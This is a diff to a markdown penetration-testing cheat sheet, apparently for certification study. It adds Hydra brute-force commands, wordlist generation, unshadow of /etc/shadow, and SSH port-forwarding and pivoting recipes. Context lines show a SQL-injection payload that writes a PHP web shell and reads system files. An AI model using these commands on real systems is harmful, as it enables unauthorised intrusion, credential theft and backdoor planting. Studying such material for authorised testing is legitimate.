@@ -13,7 +13,7 @@
 * [Exploitation](#Exploitation)
    * [Web application](#Exploitation-Web-application)
    * [FTP](#FTP)
-   * [Credential bruteforcing](#Credential-bruteforcing)
+   * [Password Attacks](#Password-Attacks)
    * [SMB and NETBIOS](#SMB-and-NETBIOS)
    * [NFS Shares](#NFS-Shares)
    * [All the Shells](#Shells)
@@ -36,11 +36,32 @@ ssh key files needs to be permission 600
 sudo chmod 600 <FILE>
 ```
 
+#### RDP commands
+```
+xfreerdp /d:<DOMAIN> /u:<USERNAME> /v:<TARGET IP< +clipboard
+```
+
+## cmd
+#### Find string
+```
+| findstr /I “<FIND STRING>”
+```
+
+#### Ignore string
+```
+| findstr /v “<IGNORE STRING>” 
+```
+
 ## Powershell
 #### Powershell flags
 - ```-nop```: (```-noprofile```) which instructs powershell not to load the powershell user profile.
 -	```-w hidden```: to avoid creating a window on the user’s desktop
 -	```-e```: (```-EncodedCommand```) use base64 encoding
+
+#### Start as admin
+```
+powershell.exe Start-Process cmd.exe -Verb runAs
+```
 
 #### AMSI Bypass
 ```
@@ -259,6 +280,17 @@ When modifying web exploits, there are several key questions we generally need t
 - use ```load_file('C:/Windows/System32/drivers/etc/hosts')``` to load files instead of database data.
 - use ```"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '<PATH TO WEBROOT>/backdoor.php'``` to create a simple php backdoor.
 
+#### MYSQL Commands
+```
+show grants;
+show variables;
+show databases;
+use <DATABASE>;
+show tables;
+describe <TABLE>;
+SELECT * FROM <TABLE>;
+```
+
 ### File upload
 #### File upload intruder extensions list
 ```
@@ -268,18 +300,19 @@ When modifying web exploits, there are several key questions we generally need t
 ## FTP
 - Check if login is allowed as anonymous:anonymous.
 
-## Credential bruteforcing
-#### Hydra FTP
+## Password Attacks
+https://github.com/danielmiessler/SecLists
+#### Hydra bruteforce FTP
 ```
 hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ftp://<IP>:<PORT>
 ```
 
-#### Hydra SSH
+#### Hydra bruteforce SSH
 ```
 hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ssh://<IP>:<PORT>
 ```
 
-#### Hydra HTTP login
+#### Hydra bruteforce HTTP login
 Login using Burp or check in developers tools to check the request for the required information! You need to get the username/password/login parameter and the error message!
 
 https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
@@ -289,6 +322,22 @@ hydra -L <USERNAMEFILE> -P <PASSWORDFILE> <IP> http-post-form "<LOGINPAGE>:<COOK
 #EXAMPLE hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
 
 #EXAMPLE hydra -l admin -P /opt/SecLists/Passwords/xato-net-10-million-passwords-100.txt 10.10.175.0 http-post-form '/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=u8hdjDohYmqfI8o0z7Cev4b1u0jLmv9dNA9NS95wDsZeMYw6zBFeyhiLx1QuOsZ%2FXV%2Fo%2BrCdXSC4Y7%2FueaRnmboaQQ9KZQWLME84zysowmYTAW8Kea1%2Bp7phoEwMiICbLwPPteDEYl7z6nobm8x1Mb2hMDiTpDJhracgmTh%2BJwP1Rqqt&__EVENTVALIDATION=QJmkftZnDEcQIPsstxYKnQBDsulZLsB0kmrbMa4BPzAc%2FMEDChrOmztni5OWBx83r2xGNndCAgw6wJ%2F%2FoAzYtZEcyRWC%2FaPyUR5iWSO0V8%2FIodobow1OxiuoD9uZVnVO8tcQZr3NWYjFcOVxYg5WAWvPyezvfcBk2oxUdZwsutPATiKB&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:failed'
+```
+
+#### CEWL - Create a wordlist 
+```
+cewl <URL> -m <MIN CHARS> -w <FILE>.txt
+```
+
+#### Identify hashes
+```
+hashid <HAS>
+hash-identiefier
+```
+
+#### Combine /etc/passwd and /etc/shadow with unshadow
+```
+Unshadow <PASSWD FILE> <SHADOW FILE> > unshadow.txt
 ```
 
 ## SMB and NETBIOS
@@ -812,3 +861,78 @@ powercat -c <IP> -p <PORT> -i <FILE>
 ```
 
 ## Lateral movement
+### Local Port forwarding
+#### Port forwarding rinetd
+```
+apt install rinetd
+cat /etc/rinetd.conf
+```
+
+#### SSH local port forward
+```
+ssh -N -L <LOCAP ORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<TARGET IP>
+```
+
+#### SSH port forwarding over hop
+```
+ssh -N -L <BIND_ADRESS>:<PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<HOP IP>
+```
+### Remote port forwarding
+#### SSH forward local port of target back to our kali
+```
+ssh -N -R <BIND_ADRESS>:<PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<IP>
+```
+
+### Dynamic port forwarding
+```
+sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
+vim  /etc/proxychains.conf
+socks4		127.0.0.1 9000 #Change this value
+#prepend proxychains command before every command to send through the proxychain.
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
+####
+```
+
+```
+
